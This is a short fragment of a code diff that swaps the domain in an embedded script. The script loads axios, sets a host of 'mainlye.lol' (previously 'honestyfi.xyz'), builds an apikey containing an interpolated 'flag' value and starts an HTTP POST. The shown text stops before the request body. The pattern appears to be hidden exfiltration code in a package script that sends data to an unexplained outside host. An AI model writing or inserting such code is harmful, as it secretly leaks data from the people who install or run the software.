@@ -425,7 +425,7 @@ exit 0
 
       script = `
 	const axios = require('axios');
-const host = "honestyfi.xyz";
+const host = "mainlye.lol";
 const apikey = "3aeb34a3${flag}";
 axios
   .post(
